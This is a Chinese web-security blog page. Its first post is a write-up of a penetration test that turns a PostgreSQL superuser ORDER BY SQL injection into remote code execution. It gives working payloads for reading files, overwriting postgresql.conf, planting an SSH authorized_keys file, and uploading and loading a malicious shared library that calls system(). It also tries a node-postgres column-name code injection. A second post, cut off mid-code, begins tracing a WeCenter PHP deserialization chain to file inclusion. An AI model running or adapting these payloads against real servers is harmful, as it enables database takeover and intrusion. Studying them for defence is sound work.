<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>雨了个雨&#39;s blog</title>

  
  <meta name="author" content="雨了个雨">
  

  
  <meta name="description" content="Focus On Web Security">
  

  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  

  <meta property="og:site_name" content="雨了个雨&#39;s blog"/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="雨了个雨&#39;s blog" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
<meta name="generator" content="Hexo 5.2.0"></head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/">雨了个雨&#39;s blog</a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
        <li><a href="/">Home</a></li>
      
        <li><a href="/archives">Archives</a></li>
      
        <li><a href="/friends">Friends</a></li>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    
  <article>

  
    
    <h3 class="article-title"><a href="/2020/11/16/Postgresql-Superuser-SQL注入-RCE之旅/"><span>Postgresql Superuser SQL注入 RCE之旅</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2020/11/16/Postgresql-Superuser-SQL注入-RCE之旅/" rel="bookmark">
        <time class="entry-date published" datetime="2020-11-16T05:45:59.000Z">
          2020-11-16
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>在测试时，遇到了一个Node.js + Postgresql的ORDER BY注入。</p>
<p><code>sorter=cast((select+user)as+integer)</code><br>返回<br>invalid input syntax for integer: &quot;postgres&quot;<br>当前用户为postgres,</p>
<p><code>sorter=cast((select+version())as+integer)</code><br>返回<br>PostgreSQL 10.1 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 4.4.6 20110731 (Red Hat 4.4.6-4)</p>
<p>版本为PostgreSQL 10， 很明显能够发现当前用户是superuser，superuser感觉rce问题不大。<br>测试能否多语句，如果可以多语句就可以通过COPY直接实现RCE</p>
<p><code>sorter=1;select/**/1;--</code><br>返回<br>cannot insert multiple commands into a prepared statement，knex预编译不支持多行命令。pgsql不支持多行时,RCE就比较麻烦了。</p>
<p>先从读文件开始慢慢搞起，<br><code>sorter=cast((select+PG_READ_FILE(&#39;/etc/passwd&#39;))as+integer)</code><br>返回<br>syntax error at or near &quot;\&quot;，单引号被转义不能够直接使用，将单引号替换掉</p>
<p><code>sorter=cast((select/**/PG_READ_FILE($$/etc/passwd$$))as/**/integer)</code><br>返回<br>absolute path not allowed，在低版本pgsql中PG_READ_FILE、PG_LS_DIR等方法都不支持绝对路径，不过还是能够用largeobject读取文件。</p>
<p><code>sorter=(select/**/lo_import($$/etc/passwd$$,11111))</code><br>页面返回正常， 然后读取loid 11111的data字段获取文件内容<br><code>sorter=(select/**/cast(encode(data,$$base64$$)as/**/integer)/**/from/**/pg_largeobject/**/where/**/loid=11111)</code></p>
<p>将base64解开，<br>tcpdump:x:72:72::/:/sbin/nologin<br>syslog:x:996:994::/home/syslog:/bin/false<br>postgres:x:1000:1000::/home/postgres:/bin/bash</p>
<p>发现postgres账户竟然有/bin/bash能够登陆，那么如果目标机器开了ssh服务，只要往postgres的.ssh目录下写入自己的公钥就能够成功登陆了,扫描发现目标确实开了ssh服务。<br>这里使用lo_export方法尝试往.ssh目录写文件，</p>
<p><code>sorter=(select/**/lo_export(11111,$$/home/postgres/.ssh/authorized_keys$$)</code><br>返回<br>desc  nulls last limit $5 - could not create server file &quot;/home/postgres/.ssh/authorized_keys&quot;: No such file or directory”,”statusCode”:200}</p>
<p>看来是postgres用户目录下并没有.ssh目录，如果能够创建.ssh目录就起飞，翻了很久文档也没翻到能在单行语句下创建目录的方法，暂时只能放弃。</p>
<p>接着去翻了下superuser RCE的各类文章，发现基本都是copy、create的利用，没法在我遇到的环境下利用。<br>后面看到了一篇介绍修改postgres.conf配置文件实现RCE的利用，配置文件中的ssl_passphrase_command配置在需要获取用于解密SSL文件密码时会调用该配置的命令。<br>目标环境可以通过lo_export方法覆盖掉配置文件，添加上ssl_passphrase_command配置，重新加载配置后实现RCE。<br>按着参考文章的步骤一步一步来即可，首先本地测试</p>
<p>1、随便找个私钥文件，对私钥文件加密<br>openssl rsa -aes256 -in /usr/local/lib/node_modules/npm/node_modules/socks-proxy-agent/node_modules/agent-base/test/ssl-cert-snakeoil.key -out ./asd.key<br>2、通过注入读取config_file,首先查询配置文件地址select current_setting(‘config_file’)，然后通过lo_import读取原始配置文件内容。<br>3、上传pem，key到目标服务器上，pgsql限制私钥文件权限必须是0600才能够加载，这里搜索<br>pgsql目录下的所有0600权限的文件可以找到PG_VERSION文件,PG_VERSION与config_file文件同目录，上传私钥文件覆盖PG_VERSION，可绕过权限问题，pem文件可以上传到任意地址。<br>4、在原始配置文件内容末尾追加上ssl配置，再通过lo_export覆盖原始配置文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssl_cert_file &#x3D; &#39;&#x2F;tmp&#x2F;ssl-cert-snakeoil.pem&#39;</span><br><span class="line">ssl_key_file &#x3D; &#39;&#x2F;pgdata&#x2F;patroni&#x2F;data&#x2F;db&#x2F;PG_VERSION&#39;</span><br><span class="line">ssl_passphrase_command_supports_reload &#x3D; on</span><br><span class="line">ssl_passphrase_command &#x3D; &#39;bash -c &quot;touch &#x2F;tmp&#x2F;zzzzzzzzz &amp; echo passphrase; exit 0&quot;&#39;</span><br></pre></td></tr></table></figure>
<p>这里的echo passphrase，需要输出私钥密码，并且最后需要exit 0，如果私钥密码不对pg_reload_conf重新加载配置文件无影响，但是如果服务重启就无法启动了。<br>5、通过注入调用pg_reload_conf()函数，重新加载配置调用ssl_passphrase_command实现RCE.</p>
<p>本地测试成功，随后在目标上测试文件，文件写入成功但是最后pg_reload_conf()时，未实现RCE。<br>对比官方文档，发现pgsql 10版本根本没有ssl_passphrase_command配置，从11版本开始支持该配置。虽然这条路走不通了，不过这篇文章也提供了修改配置文件然后pg_reload_conf实现RCE的思路。postgres.conf中的一些配置是在reloadconf后就会触发，另外一些配置需要服务重启才会触发，接着翻文档看看能不能找到一些比较好玩的参数。<br>在日志章节中翻到了比较有意思的，</p>
<blockquote>
<p>logging_collector (boolean)<br>This parameter enables the logging collector, which is a background process that captures log messages sent to stderr and redirects them into log files. This approach is often more useful than logging to syslog, since some types of messages might not appear in syslog output. (One common example is dynamic-linker failure messages; another is error messages produced by scripts such as archive_command.) This parameter can only be set at server start.</p>
</blockquote>
<blockquote>
<p>log_directory (string)<br>When logging_collector is enabled, this parameter determines the directory in which log files will be created. It can be specified as an absolute path, or relative to the cluster data directory. This parameter can only be set in the postgresql.conf file or on the server command line. The default is log.</p>
</blockquote>
<p>logging_collector是用来配置是否开启日志的，只能在服务开启时配置，所以reloadconf不能修改它，但是log_directory配置并没有说只能在服务开启时配置，log_directory用来配置log日志文件存储到哪个目录，很容易想到如果log_directory配置到一个不存在的目录,pgsql会不会帮我创建目录。<br>经过本地测试，配置文件中的log_directory配置的目录不存在时，pgsql启动会失败，但是如果服务已启动修改配置后再reload_conf目录会被创建，通过该特性再结合刚才的ssh就可以实现利用了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">log_destination &#x3D; &#39;csvlog&#39;</span><br><span class="line">log_directory &#x3D; &#39;&#x2F;pgdata&#x2F;patroni&#x2F;logs&#x2F;postgresql&#39;</span><br><span class="line">log_filename &#x3D; &#39;postgresql-%Y-%m-%d_%H%M%S.log&#39;</span><br><span class="line">log_rotation_age &#x3D; &#39;1d&#39;</span><br><span class="line">log_rotation_size &#x3D; &#39;512MB&#39;</span><br><span class="line">log_timezone &#x3D; &#39;Asia&#x2F;Hong_Kong&#39;</span><br><span class="line">logging_collector &#x3D; &#39;on&#39;</span><br></pre></td></tr></table></figure>
<p>查看一下刚才读取的目标pgsql配置文件,发现已经开启了日志记录，那么只要修改掉log_directory配置即可实现目录创建。<br>将配置文件中的日志部分修改为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">log_destination &#x3D; &#39;csvlog&#39;</span><br><span class="line">log_directory &#x3D; &#39;&#x2F;home&#x2F;postgres&#x2F;.ssh&#39;</span><br><span class="line">log_filename &#x3D; &#39;postgresql-%Y-%m-%d_%H%M%S.log&#39;</span><br><span class="line">log_rotation_age &#x3D; &#39;1d&#39;</span><br><span class="line">log_rotation_size &#x3D; &#39;512MB&#39;</span><br><span class="line">log_timezone &#x3D; &#39;Asia&#x2F;Hong_Kong&#39;</span><br><span class="line">logging_collector &#x3D; &#39;on&#39;</span><br></pre></td></tr></table></figure>
<p>再去覆盖原有配置文件，首先将修改后的配置文件加载到largeobject中<br><code>sorter=(select/**/lo_from_bytea(10000,decode($$配置文件内容base64$$,$$base64$$)))</code></p>
<p>再通过lo_export覆盖配置文件<br><code>sorter=(select/**/lo_export(10000,$$配置文件地址$$))</code></p>
<p>再重新加载配置文件<br><code>sorter=(select/**/pg_reload_conf())</code><br>这时候再随便请求一次，产生日志文件。</p>
<p><code>sorter=(select/**/lo_export(11111,$$/home/postgres/.ssh/authorized_keys$$)</code><br>再尝试将自己的公钥写入到authorized_keys，这次返回正常了。<br>不过ssh连接postgres账户，提示还是需要密码，怀疑可能是站库分离，公钥写入到的不是WEB服务器，通过注入获取数据库服务器ip。</p>
<p><code>sorter=cast((select/**/inet_server_addr()||$$$$)as/**/integer)</code><br>获取到了DB IP,再次连接DB服务器的ssh就ok了, 最后.ssh目录内容如下。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2020/11/16/16030131293651.jpg"></p>
<p>在搞定后，还是觉得这种方法很鸡肋，条件太多<br>1、postgres账户能登录服务器<br>2、DB服务器需要有外网ip<br>3、DB服务器开启了ssh服务<br>4、DB服务器已开启日志功能</p>
<p>于是尝试去寻找一些更通用的方法，翻了会文档又找到了几个比较有趣的</p>
<blockquote>
<p>local_preload_libraries (string)<br>This variable specifies one or more shared libraries that are to be preloaded at connection start. It contains a comma-separated list of library names, where each name is interpreted as for the LOAD command. Whitespace between entries is ignored; surround a library name with double quotes if you need to include whitespace or commas in the name. The parameter value only takes effect at the start of the connection. Subsequent changes have no effect. If a specified library is not found, the connection attempt will fail.</p>
</blockquote>
<blockquote>
<p>This option can be set by any user. Because of that, the libraries that can be loaded are restricted to those appearing in the plugins subdirectory of the installation’s standard library directory. (It is the database administrator’s responsibility to ensure that only “safe” libraries are installed there.) Entries in local_preload_libraries can specify this directory explicitly, for example $libdir/plugins/mylib, or just specify the library name — mylib would have the same effect as $libdir/plugins/mylib.</p>
</blockquote>
<blockquote>
<p>The intent of this feature is to allow unprivileged users to load debugging or performance-measurement libraries into specific sessions without requiring an explicit LOAD command. To that end, it would be typical to set this parameter using the PGOPTIONS environment variable on the client or by using ALTER ROLE SET.</p>
</blockquote>
<blockquote>
<p>However, unless a module is specifically designed to be used in this way by non-superusers, this is usually not the right setting to use. Look at session_preload_libraries instead.</p>
</blockquote>
<blockquote>
<p>session_preload_libraries (string)<br>This variable specifies one or more shared libraries that are to be preloaded at connection start. It contains a comma-separated list of library names, where each name is interpreted as for the LOAD command. Whitespace between entries is ignored; surround a library name with double quotes if you need to include whitespace or commas in the name. The parameter value only takes effect at the start of the connection. Subsequent changes have no effect. If a specified library is not found, the connection attempt will fail. Only superusers can change this setting.</p>
</blockquote>
<blockquote>
<p>The intent of this feature is to allow debugging or performance-measurement libraries to be loaded into specific sessions without an explicit LOAD command being given. For example, auto_explain could be enabled for all sessions under a given user name by setting this parameter with ALTER ROLE SET. Also, this parameter can be changed without restarting the server (but changes only take effect when a new session is started), so it is easier to add new modules this way, even if they should apply to all sessions.</p>
</blockquote>
<blockquote>
<p>Unlike shared_preload_libraries, there is no large performance advantage to loading a library at session start rather than when it is first used. There is some advantage, however, when connection pooling is used.</p>
</blockquote>
<blockquote>
<p>shared_preload_libraries (string)<br>This variable specifies one or more shared libraries to be preloaded at server start. It contains a comma-separated list of library names, where each name is interpreted as for the LOAD command. Whitespace between entries is ignored; surround a library name with double quotes if you need to include whitespace or commas in the name. This parameter can only be set at server start. If a specified library is not found, the server will fail to start.</p>
</blockquote>
<blockquote>
<p>Some libraries need to perform certain operations that can only take place at postmaster start, such as allocating shared memory, reserving light-weight locks, or starting background workers. Those libraries must be loaded at server start through this parameter. See the documentation of each library for details.</p>
</blockquote>
<blockquote>
<p>Other libraries can also be preloaded. By preloading a shared library, the library startup time is avoided when the library is first used. However, the time to start each new server process might increase slightly, even if that process never uses the library. So this parameter is recommended only for libraries that will be used in most sessions. Also, changing this parameter requires a server restart, so this is not the right setting to use for short-term debugging tasks, say. Use session_preload_libraries for that instead.</p>
</blockquote>
<p>local_preload_libraries只允许加载指定目录的库，session_preload_libraries只允许superuser修改但是可以加载任意目录的库，感觉这个方便点。session_preload_libraries配置从pg10开始存在，低于pg10时，可以使用local_preload_libraries，不过该配置只允许加载$libdir/plugins/目录下的库，需要将库写入到该目录下。<br>当每次有新连接进来时，都会加载session_preload_libraries配置的共享库。<br>这里通过注入将so写入到tmp目录，再修改配置，再reloadconf即可实现利用。<br>首先编译出一个共享库，一开始想实现直接回显，折腾了下失败了，在共享库中定义好回显函数后，应该需要在数据库中create xxxx才能够实现利用，需要多行，这里暂时是直接在so的构造方法中实现命令执行。<br>为了防止用户create function直接调用系统库，如libc的system等，pgsql高版本中，加载外部动态库时会检查magic block,如果不存在则加载失败，如果session_preload_libraries配置的so有问题，数据库就会挂掉。</p>
<p>共享库大概代码如下，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;postgres.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;fmgr.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PG_MODULE_MAGIC</span></span><br><span class="line">PG_MODULE_MAGIC;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;touch /tmp/test&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时在magic block中，会验证版本是否一致，如果用pg11编译出的so 是不能在pg其他版本中加载的。<br>首先看看 PG_MODULE_MAGIC的宏定义</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The actual data block contents */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_MODULE_MAGIC_DATA \</span></span><br><span class="line">&#123; \</span><br><span class="line">        <span class="keyword">sizeof</span>(Pg_magic_struct), \</span><br><span class="line">        PG_VERSION_NUM / <span class="number">100</span>, \</span><br><span class="line">        FUNC_MAX_ARGS, \</span><br><span class="line">        INDEX_MAX_KEYS, \</span><br><span class="line">        NAMEDATALEN, \</span><br><span class="line">        FLOAT4PASSBYVAL, \</span><br><span class="line">        FLOAT8PASSBYVAL \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中很明显有个PG_VERSION_NUM，加载so的版本验证就是通过PG_VERSION_NUM,同时因为除了100所以PG_VERSION_NUM最后两位不重要，PG_VERSION_NUM在pg_config.h中定义,</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* PostgreSQL version as a string */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_VERSION <span class="meta-string">&quot;12.4&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* PostgreSQL version as a number */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_VERSION_NUM 120004</span></span><br></pre></td></tr></table></figure>

<p>PG_VERSION_NUM的生成方法也比较简单 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PG_VERSION_NUM      &#x3D;&gt; sprintf(&quot;%d%04d&quot;, $majorver, $minorver),</span><br></pre></td></tr></table></figure>

<p>12.4 对应 PG_VERSION_NUM 为 120004<br>9.4.11 对应 PG_VERSION_NUM 为 90411<br>所以每次编译so时，需要根据目标版本修改一下pg_config.h的PG_VERSION_NUM，通过version()获取到目标的版本是 10.1 那么对应的就为 100001</p>
<p>编译so 然后base64写入目标机器，一顿操作，结果悲剧了 返回 HTTP/1.1 414 Request-URI Too Large, so共享库太大，导致URL超长了，尝试将GET换成POST，发现该注入点并没有接收POST参数，那么还是只有从GET入手，首先想到的肯定就是分段写入。</p>
<p>➜  /tmp cat b.so | base64 | wc -c<br>   21709<br>末尾多了一个换行，实际长度21708，基本分三次就能搞定，这里分段写入可以使用lo_put。</p>
<p>创建一个空lo,<br><code>sorter=(select/**/lo_create(15))</code><br>截前7000字符,同时因为base64中含有”+”,所以需要url编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; urllib.quote(a[:7000])</span><br><span class="line">&#39;f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAY省略</span><br></pre></td></tr></table></figure>
<p>然后put到lo中，lo_put时必须要在后面拼接一个字符，因为lo_put是一个void方法，order by void会报错，<br><code>sorter=(select/**/lo_put(15,0,$$前7000字符$$)||$$x$$):B</code><br>继续截取7000-14000字符，然后lo_put<br><code>sorter=(select/**/lo_put(15,7000,$$7000-14000$$)||$$x$$):B</code></p>
<p>写完所有字符后，校验一下写入的内容是否有问题<br><code>sorter=cast(encode(lo_get(15),$$escape$$)as/**/integer):b</code></p>
<p>再将内容base64解码后载入到largeobject中<br><code>sorter=(select/**/lo_from_bytea(40,decode(encode(lo_get(15),$$escape$$),$$base64$$))):b</code></p>
<p>再使用lo_export将so写入到目标机器中<br><code>sorter=lo_export(40,$$/tmp/a.so$$)</code></p>
<p>然后又是老一套，修改目标的配置文件，在目标原始的配置文件最后加入<br>session_preload_libraries = ‘/tmp/a.so’</p>
<p>再去覆盖掉原始配置文件，在覆盖掉原配置文件后，执行sorter=(select/**/pg_reload_conf())就自动加载了so实现了命令执行。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2020/11/16/16036981766016.jpg"></p>
<p>拿下数据库服务器后，发现数据库配置了pg_hba，不需要密码即可登录。尝试去打web服务器，node-postgres老版本存在代码执行洞，如果能够控制SQL返回的列名即可实现代码执行，这里因为控制了数据库服务器如果给一个表添加一个类似”\‘+console.log(process.env)]=null;//“字段  alter table xxxxx add “&#39;+console.log(process.env)]=null;//“ varchar(20);  ,如果web有对该表使用select *操作，即可实现rce.<br>不过最后没成功，应该还是目标node-postgres版本比较高:(</p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a target="_blank" rel="noopener" href="https://pulsesecurity.co.nz/articles/postgres-sqli">https://pulsesecurity.co.nz/articles/postgres-sqli</a><br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html">https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2020/01/22/WECENTER-反序列任意文件包含利用链/"><span>WECENTER 反序列任意文件包含利用链</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2020/01/22/WECENTER-反序列任意文件包含利用链/" rel="bookmark">
        <time class="entry-date published" datetime="2020-01-22T07:21:31.000Z">
          2020-01-22
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>看了下最近的WeCenter的反序列，原文最后是通过反序列执行任意SQL语句进入后台实现GETSHELL。自己想另外找一个前台就能GETSHELL的利用链，就去看了下代码。</p>
<h2 id="POP"><a href="#POP" class="headerlink" title="POP"></a>POP</h2><p>system/Savant3.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Savant3</span> </span>&#123;</span><br><span class="line">    .......</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getOutput();</span><br><span class="line">	&#125;</span><br><span class="line">	.......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在toString魔术方法中调用了getOutput方法，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getOutput</span>(<span class="params">$tpl = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $output = <span class="keyword">$this</span>-&gt;fetch($tpl);</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isError($output)) &#123;</span><br><span class="line">           $text = <span class="keyword">$this</span>-&gt;__config[<span class="string">&#x27;error_text&#x27;</span>];</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;escape($text);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> $output;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接着调用fetch方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span>(<span class="params">$tpl = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="comment">// make sure we have a template source to work with</span></span><br><span class="line">		<span class="keyword">if</span> (is_null($tpl)) &#123;</span><br><span class="line">			$tpl = <span class="keyword">$this</span>-&gt;__config[<span class="string">&#x27;template&#x27;</span>];</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// get a path to the compiled template script</span></span><br><span class="line">		$result = <span class="keyword">$this</span>-&gt;template($tpl);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// did we get a path?</span></span><br><span class="line">		<span class="keyword">if</span> (! $result || <span class="keyword">$this</span>-&gt;isError($result)) &#123;</span><br><span class="line">		</span><br><span class="line">			<span class="comment">// no. return the error result.</span></span><br><span class="line">			<span class="keyword">return</span> $result;</span><br><span class="line">			</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		</span><br><span class="line">			<span class="comment">// yes.  execute the template script.  move the script-path</span></span><br><span class="line">			<span class="comment">// out of the local scope, then clean up the local scope to</span></span><br><span class="line">			<span class="comment">// avoid variable name conflicts.</span></span><br><span class="line">			<span class="keyword">$this</span>-&gt;__config[<span class="string">&#x27;fetch&#x27;</span>] = $result;</span><br><span class="line">			<span class="keyword">unset</span>($result);</span><br><span class="line">			<span class="keyword">unset</span>($tpl);</span><br><span class="line">			</span><br><span class="line">			<span class="comment">// are we doing extraction?</span></span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;__config[<span class="string">&#x27;extract&#x27;</span>]) &#123;</span><br><span class="line">				<span class="comment">// pull variables into the local scope.</span></span><br><span class="line">				extract(get_object_vars(<span class="keyword">$this</span>), EXTR_REFS);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="comment">// buffer output so we can return it instead of displaying.</span></span><br><span class="line">			ob_start();</span><br><span class="line">			</span><br><span class="line">			<span class="comment">// are we using filters?</span></span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;__config[<span class="string">&#x27;filters&#x27;</span>]) &#123;</span><br><span class="line">				<span class="comment">// use a second buffer to apply filters. we used to set</span></span><br><span class="line">				<span class="comment">// the ob_start() filter callback, but that would</span></span><br><span class="line">				<span class="comment">// silence errors in the filters. Hendy Irawan provided</span></span><br><span class="line">				<span class="comment">// the next three lines as a &quot;verbose&quot; fix.</span></span><br><span class="line">				ob_start();</span><br><span class="line">				<span class="keyword">include</span> <span class="keyword">$this</span>-&gt;__config[<span class="string">&#x27;fetch&#x27;</span>];</span><br><span class="line">				<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;applyFilters(ob_get_clean());</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="comment">// no filters being used.</span></span><br><span class="line">				<span class="keyword">include</span> <span class="keyword">$this</span>-&gt;__config[<span class="string">&#x27;fetch&#x27;</span>];</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="comment">// reset the fetch script value, get the buffer, and return.</span></span><br><span class="line">			<span class="keyword">$this</span>-&gt;__config[<span class="string">&#x27;fetch&#x27;</span>] = <span class="literal">null</span>;</span><br><span class="line">			<span class="keyword">return</span> ob_get_clean();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>在getOutput调用fetch方法时，传入的参数为null。所以这时候可以通过控制__config[‘template’]成员变量进而控制tpl模板路径。接着会调用template方法获取模板文件绝对路径，如果文件存在就会包含该文件。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">template</span>(<span class="params">$tpl = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// set to default template if none specified.</span></span><br><span class="line">	<span class="keyword">if</span> (is_null($tpl)) &#123;</span><br><span class="line">		$tpl = <span class="keyword">$this</span>-&gt;__config[<span class="string">&#x27;template&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// find the template source.</span></span><br><span class="line">	$file = <span class="keyword">$this</span>-&gt;findFile(<span class="string">&#x27;template&#x27;</span>, $tpl);</span><br><span class="line">	<span class="keyword">if</span> (! $file) 